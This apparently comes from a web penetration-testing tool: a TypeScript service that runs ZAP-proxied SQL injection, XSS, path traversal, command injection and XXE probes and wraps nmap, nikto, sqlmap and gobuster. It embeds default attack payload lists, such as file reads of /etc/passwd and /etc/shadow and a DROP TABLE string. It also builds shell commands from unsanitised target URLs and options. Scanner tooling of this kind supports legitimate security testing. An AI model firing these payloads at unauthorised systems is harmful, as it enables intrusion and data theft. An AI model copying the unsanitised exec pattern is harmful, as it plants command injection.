import { exec } from 'child_process';
import { promisify } from 'util';
import axios, { AxiosRequestConfig, Method } from 'axios';
import * as fs from 'fs';
import * as path from 'path';
import { ZapProxyService } from './zapProxy.service';

const execAsync = promisify(exec);

export interface AttackConfig {
  parameters?: string[];
  payloads?: string[];
  options?: {
    timeout?: number;
    delay?: number;
    threads?: number;
    verbose?: boolean;
  };
}

export interface CustomRequestConfig {
  method: Method;
  url: string;
  headers?: Record<string, string>;
  body?: any;
  options?: {
    timeout?: number;
    followRedirects?: boolean;
    validateSSL?: boolean;
  };
}

export interface ScanResult {
  success: boolean;
  vulnerabilities: any[];
  requests: any[];
  responses: any[];
  metadata: {
    startTime: string;
    endTime: string;
    duration: number;
    requestCount: number;
    targetUrl: string;
    scanType: string;
  };
  rawOutput?: string;
}

export class ManualScanService {
  private zapService: ZapProxyService;
  private payloadsPath: string;
  private wordlistsPath: string;

  constructor() {
    this.zapService = new ZapProxyService();
    this.payloadsPath = path.join(__dirname, '../../data/payloads');
    this.wordlistsPath = path.join(__dirname, '../../data/wordlists');
    this.initializeDataDirectories();
  }

  private async initializeDataDirectories(): Promise<void> {
    try {
      if (!fs.existsSync(this.payloadsPath)) {
        fs.mkdirSync(this.payloadsPath, { recursive: true });
        await this.createDefaultPayloads();
      }
      
      if (!fs.existsSync(this.wordlistsPath)) {
        fs.mkdirSync(this.wordlistsPath, { recursive: true });
        await this.createDefaultWordlists();
      }
    } catch (error) {
      console.error('Failed to initialize data directories:', error);
    }
  }

  // =============================================================================
  // AVAILABLE TOOLS
  // =============================================================================

  async getAvailableTools(): Promise<any> {
    return {
      zapAttacks: [
        { id: 'sql-injection', name: 'SQL Injection', category: 'injection' },
        { id: 'xss', name: 'Cross-Site Scripting (XSS)', category: 'injection' },
        { id: 'directory-traversal', name: 'Directory Traversal', category: 'pathTraversal' },
        { id: 'command-injection', name: 'Command Injection', category: 'injection' },
        { id: 'csrf', name: 'Cross-Site Request Forgery', category: 'csrf' },
        { id: 'xxe', name: 'XML External Entity (XXE)', category: 'injection' }
      ],
      fuzzingTools: [
        { id: 'param-fuzzing', name: 'Parameter Fuzzing', category: 'fuzzing' },
        { id: 'directory-fuzzing', name: 'Directory Fuzzing', category: 'fuzzing' }
      ],
      kaliTools: [
        { id: 'nmap', name: 'Nmap', category: 'reconnaissance', available: await this.checkToolAvailable('nmap') },
        { id: 'nikto', name: 'Nikto', category: 'webScan', available: await this.checkToolAvailable('nikto') },
        { id: 'sqlmap', name: 'SQLMap', category: 'injection', available: await this.checkToolAvailable('sqlmap') },
        { id: 'gobuster', name: 'Gobuster', category: 'fuzzing', available: await this.checkToolAvailable('gobuster') }
      ],
      customTools: [
        { id: 'custom-request', name: 'Custom HTTP Request', category: 'manual' },
        { id: 'request-intercept', name: 'Request Interception', category: 'proxy' }
      ]
    };
  }

  private async checkToolAvailable(toolName: string): Promise<boolean> {
    try {
      await execAsync(`which ${toolName}`);
      return true;
    } catch {
      try {
        await execAsync(`${toolName} --version`);
        return true;
      } catch {
        return false;
      }
    }
  }

  // =============================================================================
  // ZAP-BASED ATTACK METHODS
  // =============================================================================

  // Generic method for payload-based attacks
  private async runPayloadBasedTest(
    targetUrl: string, 
    config: AttackConfig, 
    scanType: string,
    analyzeFunction: (response: any, param: string, payload: string) => Promise<any | null>
  ): Promise<ScanResult> {
    const startTime = new Date().toISOString();
    const vulnerabilities: any[] = [];
    const requests: any[] = [];
    const responses: any[] = [];

    try {
      const payloads = config.payloads || await this.getPayloads(scanType);
      const parameters = config.parameters || await this.extractParameters(targetUrl);

      for (const param of parameters) {
        for (const payload of payloads) {
          try {
            const testUrl = this.injectPayload(targetUrl, param, payload);
            const response = await this.sendZapRequest('GET', testUrl);
            
            requests.push({
              url: testUrl,
              parameter: param,
              payload,
              timestamp: new Date().toISOString()
            });

            responses.push(response);

            const vulnerability = await analyzeFunction(response, param, payload);
            if (vulnerability) {
              vulnerabilities.push(vulnerability);
            }

            if (config.options?.delay) {
              await this.sleep(config.options.delay);
            }
          } catch (error) {
            console.error(`${scanType} test failed for ${param}:`, error);
          }
        }
      }

      const endTime = new Date().toISOString();
      return {
        success: true,
        vulnerabilities,
        requests,
        responses,
        metadata: {
          startTime,
          endTime,
          duration: new Date(endTime).getTime() - new Date(startTime).getTime(),
          requestCount: requests.length,
          targetUrl,
          scanType
        }
      };
    } catch (error) {
      throw new Error(`${scanType} test failed: ${error instanceof Error ? error.message : 'Unknown error'}`);
    }
  }

  async runSqlInjectionTest(targetUrl: string, config: AttackConfig): Promise<ScanResult> {
    return this.runPayloadBasedTest(targetUrl, config, 'sql-injection', this.analyzeSqlInjectionResponse.bind(this));
  }

  async runXssTest(targetUrl: string, config: AttackConfig): Promise<ScanResult> {
    return this.runPayloadBasedTest(targetUrl, config, 'xss', this.analyzeXssResponse.bind(this));
  }

  async runDirectoryTraversalTest(targetUrl: string, config: AttackConfig): Promise<ScanResult> {
    return this.runPayloadBasedTest(targetUrl, config, 'directory-traversal', this.analyzeDirectoryTraversalResponse.bind(this));
  }

  async runCommandInjectionTest(targetUrl: string, config: AttackConfig): Promise<ScanResult> {
    return this.runPayloadBasedTest(targetUrl, config, 'command-injection', this.analyzeCommandInjectionResponse.bind(this));
  }

  async runCsrfTest(targetUrl: string, options: any = {}): Promise<ScanResult> {
    const startTime = new Date().toISOString();
    const vulnerabilities: any[] = [];
    const requests: any[] = [];
    const responses: any[] = [];

    try {
      // Get forms from the target page
      const response = await this.sendZapRequest('GET', targetUrl);
      requests.push({
        url: targetUrl,
        method: 'GET',
        timestamp: new Date().toISOString()
      });
      responses.push(response);

      // Extract forms and test for CSRF protection
      const forms = this.extractForms(response.body);
      
      for (const form of forms) {
        try {
          // Test form submission without CSRF token
          const formResponse = await this.sendZapRequest(form.method || 'POST', form.action, form.data);
          
          requests.push({
            url: form.action,
            method: form.method || 'POST',
            data: form.data,
            timestamp: new Date().toISOString()
          });

          responses.push(formResponse);

          const vulnerability = await this.analyzeCsrfResponse(formResponse, form);
          if (vulnerability) {
            vulnerabilities.push(vulnerability);
          }
        } catch (error) {
          console.error(`CSRF test failed for form ${form.action}:`, error);
        }
      }

      const endTime = new Date().toISOString();
      return {
        success: true,
        vulnerabilities,
        requests,
        responses,
        metadata: {
          startTime,
          endTime,
          duration: new Date(endTime).getTime() - new Date(startTime).getTime(),
          requestCount: requests.length,
          targetUrl,
          scanType: 'csrf'
        }
      };
    } catch (error) {
      throw new Error(`CSRF test failed: ${error instanceof Error ? error.message : 'Unknown error'}`);
    }
  }

  async runXxeTest(targetUrl: string, config: { xmlPayloads?: string[], options?: any }): Promise<ScanResult> {
    const startTime = new Date().toISOString();
    const vulnerabilities: any[] = [];
    const requests: any[] = [];
    const responses: any[] = [];

    try {
      const xmlPayloads = config.xmlPayloads || await this.getPayloads('xxe');

      for (const payload of xmlPayloads) {
        try {
          const response = await this.sendZapRequest('POST', targetUrl, payload, {
            'Content-Type': 'application/xml'
          });
          
          requests.push({
            url: targetUrl,
            method: 'POST',
            payload,
            timestamp: new Date().toISOString()
          });

          responses.push(response);

          const vulnerability = await this.analyzeXxeResponse(response, payload);
          if (vulnerability) {
            vulnerabilities.push(vulnerability);
          }

          if (config.options?.delay) {
            await this.sleep(config.options.delay);
          }
        } catch (error) {
          console.error(`XXE test failed:`, error);
        }
      }

      const endTime = new Date().toISOString();
      return {
        success: true,
        vulnerabilities,
        requests,
        responses,
        metadata: {
          startTime,
          endTime,
          duration: new Date(endTime).getTime() - new Date(startTime).getTime(),
          requestCount: requests.length,
          targetUrl,
          scanType: 'xxe'
        }
      };
    } catch (error) {
      throw new Error(`XXE test failed: ${error instanceof Error ? error.message : 'Unknown error'}`);
    }
  }

  // =============================================================================
  // FUZZING METHODS
  // =============================================================================

  // Generic method for fuzzing-based attacks
  private async runFuzzingBasedTest(
    targetUrl: string,
    config: any,
    scanType: string,
    generateTestUrl: (baseUrl: string, item: string) => string,
    analyzeFunction: (response: any, item: string) => any | null
  ): Promise<ScanResult> {
    const startTime = new Date().toISOString();
    const vulnerabilities: any[] = [];
    const requests: any[] = [];
    const responses: any[] = [];

    try {
      const wordlist = config.wordlists?.[0] || 'common-directories.txt';
      const words = await this.loadWordlist(wordlist);

      for (const word of words) {
        try {
          const testUrl = generateTestUrl(targetUrl, word);
          const response = await this.sendZapRequest('GET', testUrl);
          
          requests.push({
            url: testUrl,
            word,
            timestamp: new Date().toISOString()
          });

          responses.push(response);

          const finding = analyzeFunction(response, word);
          if (finding) {
            vulnerabilities.push(finding);
          }

          if (config.options?.delay) {
            await this.sleep(config.options.delay);
          }
        } catch (error) {
          console.error(`${scanType} failed for ${word}:`, error);
        }
      }

      const endTime = new Date().toISOString();
      return {
        success: true,
        vulnerabilities,
        requests,
        responses,
        metadata: {
          startTime,
          endTime,
          duration: new Date(endTime).getTime() - new Date(startTime).getTime(),
          requestCount: requests.length,
          targetUrl,
          scanType
        }
      };
    } catch (error) {
      throw new Error(`${scanType} failed: ${error instanceof Error ? error.message : 'Unknown error'}`);
    }
  }

  async runParameterFuzzing(targetUrl: string, config: { parameters?: string[], wordlists?: string[], options?: any }): Promise<ScanResult> {
    const startTime = new Date().toISOString();
    const vulnerabilities: any[] = [];
    const requests: any[] = [];
    const responses: any[] = [];

    try {
      const parameters = config.parameters || await this.extractParameters(targetUrl);
      const wordlist = config.wordlists?.[0] || 'common-params.txt';
      const words = await this.loadWordlist(wordlist);

      for (const param of parameters) {
        for (const word of words) {
          try {
            const testUrl = this.injectPayload(targetUrl, param, word);
            const response = await this.sendZapRequest('GET', testUrl);
            
            requests.push({
              url: testUrl,
              parameter: param,
              payload: word,
              timestamp: new Date().toISOString()
            });

            responses.push(response);

            const finding = await this.analyzeFuzzingResponse(response, param, word);
            if (finding) {
              vulnerabilities.push(finding);
            }

            if (config.options?.delay) {
              await this.sleep(config.options.delay);
            }
          } catch (error) {
            console.error(`Parameter fuzzing failed for ${param}:`, error);
          }
        }
      }

      const endTime = new Date().toISOString();
      return {
        success: true,
        vulnerabilities,
        requests,
        responses,
        metadata: {
          startTime,
          endTime,
          duration: new Date(endTime).getTime() - new Date(startTime).getTime(),
          requestCount: requests.length,
          targetUrl,
          scanType: 'parameter-fuzzing'
        }
      };
    } catch (error) {
      throw new Error(`Parameter fuzzing failed: ${error instanceof Error ? error.message : 'Unknown error'}`);
    }
  }

  async runDirectoryFuzzing(targetUrl: string, config: { wordlists?: string[], options?: any }): Promise<ScanResult> {
    return this.runFuzzingBasedTest(
      targetUrl,
      config,
      'directory-fuzzing',
      (baseUrl, word) => `${baseUrl.replace(/\/$/, '')}/${word}`,
      (response, word) => {
        if (response.status === 200 || response.status === 301 || response.status === 302) {
          return {
            type: 'Directory/File Found',
            url: response.url,
            status: response.status,
            size: response.body?.length || 0,
            severity: 'INFO',
            timestamp: new Date().toISOString()
          };
        }
        return null;
      }
    );
  }

  // =============================================================================
  // KALI LINUX TOOLS INTEGRATION
  // =============================================================================

  // Generic method for command-line tool execution
  private async runCommandLineTool(
    command: string,
    scanType: string,
    targetUrl: string,
    timeout: number = 300000
  ): Promise<ScanResult> {
    const startTime = new Date().toISOString();
    
    try {
      const { stdout, stderr } = await execAsync(command, { timeout });

      const endTime = new Date().toISOString();
      
      return {
        success: true,
        vulnerabilities: [],
        requests: [],
        responses: [],
        metadata: {
          startTime,
          endTime,
          duration: new Date(endTime).getTime() - new Date(startTime).getTime(),
          requestCount: 0,
          targetUrl,
          scanType
        },
        rawOutput: stdout
      };
    } catch (error) {
      throw new Error(`${scanType} scan failed: ${error instanceof Error ? error.message : 'Unknown error'}`);
    }
  }

  async runNmapScan(target: string, options: any = {}): Promise<ScanResult> {
    let command = `nmap`;
    
    // Add scan type options
    switch (options.scanType) {
      case 'tcp': command += ' -sS'; break;
      case 'udp': command += ' -sU'; break;
      case 'comprehensive': command += ' -sS -sV -O -A'; break;
      case 'stealth': command += ' -sS -f'; break;
      default: command += ' -sS';
    }

    // Add port range
    command += ` -p ${options.ports || '1-1000'}`;
    
    // Add timing options
    command += ` -T${options.timing || 4}`;
    
    // Add output format and target
    command += ` -oX - ${target}`;

    return this.runCommandLineTool(command, 'nmap', target);
  }

  async runNiktoScan(targetUrl: string, options: any = {}): Promise<ScanResult> {
    let command = `nikto -h ${targetUrl}`;
    
    if (options.useSSL) command += ' -ssl';
    if (options.port) command += ` -p ${options.port}`;
    if (options.format) command += ` -Format ${options.format}`;

    return this.runCommandLineTool(command, 'nikto', targetUrl, 600000);
  }

  async runSqlmapScan(targetUrl: string, options: any = {}): Promise<ScanResult> {
    let command = `sqlmap -u "${targetUrl}" --batch`;
    
    if (options.level) command += ` --level=${options.level}`;
    if (options.risk) command += ` --risk=${options.risk}`;
    if (options.dbms) command += ` --dbms=${options.dbms}`;
    if (options.techniques) command += ` --technique=${options.techniques}`;

    return this.runCommandLineTool(command, 'sqlmap', targetUrl, 1800000);
  }

  async runGobusterScan(targetUrl: string, wordlist: string, options: any = {}): Promise<ScanResult> {
    const wordlistPath = path.join(this.wordlistsPath, wordlist);
    let command = `gobuster dir -u ${targetUrl} -w ${wordlistPath}`;
    
    if (options.extensions) command += ` -x ${options.extensions}`;
    command += ` -t ${options.threads || 10}`;
    if (options.timeout) command += ` --timeout ${options.timeout}`;

    return this.runCommandLineTool(command, 'gobuster', targetUrl, 600000);
  }

  // =============================================================================
  // CUSTOM REQUEST HANDLING
  // =============================================================================

  async sendCustomRequest(config: CustomRequestConfig): Promise<any> {
    try {
      const axiosConfig: AxiosRequestConfig = {
        method: config.method,
        url: config.url,
        headers: config.headers,
        data: config.body,
        timeout: config.options?.timeout || 10000,
        maxRedirects: config.options?.followRedirects ? 5 : 0,
        validateStatus: () => true // Accept all status codes
      };

      const response = await axios(axiosConfig);
      
      return {
        status: response.status,
        statusText: response.statusText,
        headers: response.headers,
        body: response.data,
        timing: {
          timestamp: new Date().toISOString()
        }
      };
    } catch (error) {
      throw new Error(`Custom request failed: ${error instanceof Error ? error.message : 'Unknown error'}`);
    }
  }

  async runCustomSpider(targetUrl: string, options: any = {}): Promise<any> {
    try {
      return await this.zapService.runSpider(targetUrl, {
        maxChildren: options.maxChildren, // NO DEFAULT LIMIT - unlimited if not specified
        recurse: options.recurse !== false,
        contextName: options.contextName,
        subtreeOnly: options.subtreeOnly
      });
    } catch (error) {
      throw new Error(`Custom spider failed: ${error instanceof Error ? error.message : 'Unknown error'}`);
    }
  }

  // =============================================================================
  // INTERCEPTION METHODS
  // =============================================================================

  async enableInterception(): Promise<any> {
    try {
      // Enable ZAP's break functionality
      await this.zapService.setBreakEnabled(true);
      return { status: 'Interception enabled' };
    } catch (error) {
      throw new Error(`Failed to enable interception: ${error instanceof Error ? error.message : 'Unknown error'}`);
    }
  }

  async disableInterception(): Promise<any> {
    try {
      // Disable ZAP's break functionality
      await this.zapService.setBreakEnabled(false);
      return { status: 'Interception disabled' };
    } catch (error) {
      throw new Error(`Failed to disable interception: ${error instanceof Error ? error.message : 'Unknown error'}`);
    }
  }

  // =============================================================================
  // PAYLOAD AND WORDLIST MANAGEMENT
  // =============================================================================

  async getPayloads(type: string): Promise<string[]> {
    try {
      const payloadFile = path.join(this.payloadsPath, `${type}.txt`);
      
      if (fs.existsSync(payloadFile)) {
        const content = fs.readFileSync(payloadFile, 'utf-8');
        return content.split('\n').filter(line => line.trim() && !line.startsWith('#'));
      }
      
      // Return default payloads if file doesn't exist
      return this.getDefaultPayloads(type);
    } catch (error) {
      console.error(`Failed to load payloads for ${type}:`, error);
      return this.getDefaultPayloads(type);
    }
  }

  async getWordlists(): Promise<string[]> {
    try {
      if (fs.existsSync(this.wordlistsPath)) {
        return fs.readdirSync(this.wordlistsPath).filter(file => file.endsWith('.txt'));
      }
      return [];
    } catch (error) {
      console.error('Failed to get wordlists:', error);
      return [];
    }
  }

  private async loadWordlist(filename: string): Promise<string[]> {
    try {
      const wordlistFile = path.join(this.wordlistsPath, filename);
      
      if (fs.existsSync(wordlistFile)) {
        const content = fs.readFileSync(wordlistFile, 'utf-8');
        return content.split('\n').filter(line => line.trim() && !line.startsWith('#'));
      }
      
      // Return default wordlist if file doesn't exist
      return this.getDefaultWordlist(filename);
    } catch (error) {
      console.error(`Failed to load wordlist ${filename}:`, error);
      return [];
    }
  }

  // =============================================================================
  // HELPER METHODS
  // =============================================================================

  private async sendZapRequest(method: string, url: string, data?: any, headers?: any): Promise<any> {
    try {
      const response = await axios({
        method: method as Method,
        url,
        data,
        headers,
        timeout: 10000,
        validateStatus: () => true,
        proxy: {
          host: 'localhost',
          port: 8080, // ZAP proxy port
          protocol: 'http'
        }
      });

      return {
        status: response.status,
        statusText: response.statusText,
        headers: response.headers,
        body: response.data,
        timestamp: new Date().toISOString()
      };
    } catch (error) {
      throw new Error(`ZAP request failed: ${error instanceof Error ? error.message : 'Unknown error'}`);
    }
  }

  private injectPayload(url: string, parameter: string, payload: string): string {
    try {
      const urlObj = new URL(url);
      urlObj.searchParams.set(parameter, payload);
      return urlObj.toString();
    } catch {
      return `${url}${url.includes('?') ? '&' : '?'}${parameter}=${encodeURIComponent(payload)}`;
    }
  }

  private async extractParameters(url: string): Promise<string[]> {
    try {
      const urlObj = new URL(url);
      const params = Array.from(urlObj.searchParams.keys());
      
      // If no parameters found in URL, return common parameter names
      if (params.length === 0) {
        return ['id', 'page', 'search', 'query', 'user', 'file', 'path', 'url', 'redirect'];
      }
      
      return params;
    } catch {
      return ['id', 'page', 'search', 'query', 'user', 'file', 'path', 'url', 'redirect'];
    }
  }

  private extractForms(htmlContent: string): any[] {
    // Simple form extraction - in a real implementation, you might want to use a proper HTML parser
    const forms: any[] = [];
    const formRegex = /<form[^>]*action=["']([^"']*)["'][^>]*method=["']([^"']*)["'][^>]*>/gi;
    let match;

    while ((match = formRegex.exec(htmlContent)) !== null) {
      forms.push({
        action: match[1],
        method: match[2].toUpperCase(),
        data: {} // In a real implementation, extract form fields
      });
    }

    return forms;
  }

  private async sleep(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
  }

  // Analysis methods for vulnerability detection
  private async analyzeSqlInjectionResponse(response: any, parameter: string, payload: string): Promise<any | null> {
    const indicators = [
      'SQL syntax',
      'mysql_fetch',
      'ORA-',
      'Microsoft OLE DB',
      'ODBC SQL Server Driver',
      'PostgreSQL query failed',
      'PL/pgSQL'
    ];

    const bodyText = typeof response.body === 'string' ? response.body : JSON.stringify(response.body);
    
    for (const indicator of indicators) {
      if (bodyText.toLowerCase().includes(indicator.toLowerCase())) {
        return {
          type: 'SQL Injection',
          parameter,
          payload,
          indicator,
          severity: 'HIGH',
          url: response.url,
          evidence: bodyText.substring(bodyText.toLowerCase().indexOf(indicator.toLowerCase()), 200),
          timestamp: new Date().toISOString()
        };
      }
    }

    return null;
  }

  private async analyzeXssResponse(response: any, parameter: string, payload: string): Promise<any | null> {
    const bodyText = typeof response.body === 'string' ? response.body : JSON.stringify(response.body);
    
    if (bodyText.includes(payload)) {
      return {
        type: 'Cross-Site Scripting (XSS)',
        parameter,
        payload,
        severity: 'MEDIUM',
        url: response.url,
        evidence: `Payload reflected: ${payload}`,
        timestamp: new Date().toISOString()
      };
    }

    return null;
  }

  private async analyzeDirectoryTraversalResponse(response: any, parameter: string, payload: string): Promise<any | null> {
    const indicators = [
      'root:x:',
      '[boot loader]',
      'Windows Registry Editor',
      '/etc/passwd',
      'c:\\windows\\',
      '/bin/bash'
    ];

    const bodyText = typeof response.body === 'string' ? response.body : JSON.stringify(response.body);
    
    for (const indicator of indicators) {
      if (bodyText.toLowerCase().includes(indicator.toLowerCase())) {
        return {
          type: 'Directory Traversal',
          parameter,
          payload,
          indicator,
          severity: 'HIGH',
          url: response.url,
          evidence: bodyText.substring(bodyText.toLowerCase().indexOf(indicator.toLowerCase()), 200),
          timestamp: new Date().toISOString()
        };
      }
    }

    return null;
  }

  private async analyzeCommandInjectionResponse(response: any, parameter: string, payload: string): Promise<any | null> {
    const indicators = [
      'uid=',
      'gid=',
      'total ',
      'Directory of',
      'Volume in drive',
      'Microsoft Windows'
    ];

    const bodyText = typeof response.body === 'string' ? response.body : JSON.stringify(response.body);
    
    for (const indicator of indicators) {
      if (bodyText.toLowerCase().includes(indicator.toLowerCase())) {
        return {
          type: 'Command Injection',
          parameter,
          payload,
          indicator,
          severity: 'HIGH',
          url: response.url,
          evidence: bodyText.substring(bodyText.toLowerCase().indexOf(indicator.toLowerCase()), 200),
          timestamp: new Date().toISOString()
        };
      }
    }

    return null;
  }

  private async analyzeCsrfResponse(response: any, form: any): Promise<any | null> {
    // If form submission was successful without CSRF token, it's vulnerable
    if (response.status >= 200 && response.status < 400) {
      return {
        type: 'Cross-Site Request Forgery (CSRF)',
        form: form.action,
        method: form.method,
        severity: 'MEDIUM',
        evidence: 'Form submitted successfully without CSRF protection',
        timestamp: new Date().toISOString()
      };
    }

    return null;
  }

  private async analyzeXxeResponse(response: any, payload: string): Promise<any | null> {
    const indicators = [
      'root:x:',
      '/etc/passwd',
      'c:\\windows\\',
      'ENTITY',
      'DOCTYPE'
    ];

    const bodyText = typeof response.body === 'string' ? response.body : JSON.stringify(response.body);
    
    for (const indicator of indicators) {
      if (bodyText.toLowerCase().includes(indicator.toLowerCase())) {
        return {
          type: 'XML External Entity (XXE)',
          payload,
          indicator,
          severity: 'HIGH',
          evidence: bodyText.substring(bodyText.toLowerCase().indexOf(indicator.toLowerCase()), 200),
          timestamp: new Date().toISOString()
        };
      }
    }

    return null;
  }

  private async analyzeFuzzingResponse(response: any, parameter: string, payload: string): Promise<any | null> {
    // Check for interesting response codes, sizes, or content
    if (response.status === 200 && response.body && response.body.length > 1000) {
      return {
        type: 'Interesting Response',
        parameter,
        payload,
        severity: 'INFO',
        status: response.status,
        size: response.body.length,
        timestamp: new Date().toISOString()
      };
    }

    return null;
  }

  // Centralized payload and wordlist defaults
  private readonly DEFAULT_PAYLOADS: Record<string, string[]> = {
    'sql-injection': [
      "' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #", "' UNION SELECT NULL--",
      "1' AND '1'='1", "1' AND '1'='2", "admin'--", "admin'/*", "' OR 1=1--",
      "' OR 'x'='x", "1; DROP TABLE users--", "'; WAITFOR DELAY '00:00:05'--"
    ],
    'xss': [
      "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
      "javascript:alert('XSS')", "<svg onload=alert('XSS')>", "';alert('XSS');//",
      "\"><script>alert('XSS')</script>", "<iframe src=javascript:alert('XSS')>",
      "<body onload=alert('XSS')>", "<<SCRIPT>alert('XSS')//<</SCRIPT>"
    ],
    'directory-traversal': [
      "../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
      "../../../../etc/passwd", "..\\..\\..\\..\\windows\\win.ini", "../../../etc/shadow",
      "....//....//....//etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd", "..%5C..%5C..%5Cwindows%5Cwin.ini"
    ],
    'command-injection': [
      "; ls -la", "| whoami", "&& dir", "; cat /etc/passwd", "| type c:\\windows\\win.ini",
      "; id", "&& echo vulnerable", "| ping -c 4 127.0.0.1"
    ],
    'xxe': [
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///c:/windows/win.ini">]><root>&test;</root>',
      '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://example.com/xxe">]><root>&test;</root>'
    ]
  };

  private readonly DEFAULT_WORDLISTS: Record<string, string[]> = {
    'common-directories.txt': [
      'admin', 'administrator', 'backup', 'bin', 'cgi-bin', 'config', 'data',
      'docs', 'images', 'inc', 'includes', 'js', 'lib', 'login', 'old',
      'private', 'public', 'scripts', 'src', 'tmp', 'uploads', 'www'
    ],
    'common-params.txt': [
      'id', 'user', 'page', 'file', 'path', 'url', 'redirect', 'search',
      'query', 'q', 'cmd', 'exec', 'category', 'action', 'mode', 'debug'
    ],
    'common-files.txt': [
      'index.php', 'admin.php', 'login.php', 'config.php', 'backup.sql',
      'robots.txt', '.htaccess', 'web.config', 'crossdomain.xml', 'sitemap.xml'
    ]
  };

  // Default payload and wordlist creation
  private async createDefaultPayloads(): Promise<void> {
    for (const [type, payloadList] of Object.entries(this.DEFAULT_PAYLOADS)) {
      const filePath = path.join(this.payloadsPath, `${type}.txt`);
      fs.writeFileSync(filePath, payloadList.join('\n'));
    }
  }

  private async createDefaultWordlists(): Promise<void> {
    for (const [filename, wordlist] of Object.entries(this.DEFAULT_WORDLISTS)) {
      const filePath = path.join(this.wordlistsPath, filename);
      fs.writeFileSync(filePath, wordlist.join('\n'));
    }
  }

  private getDefaultPayloads(type: string): string[] {
    return this.DEFAULT_PAYLOADS[type] || [];
  }

  private getDefaultWordlist(filename: string): string[] {
    return this.DEFAULT_WORDLISTS[filename] || [];
  }
}
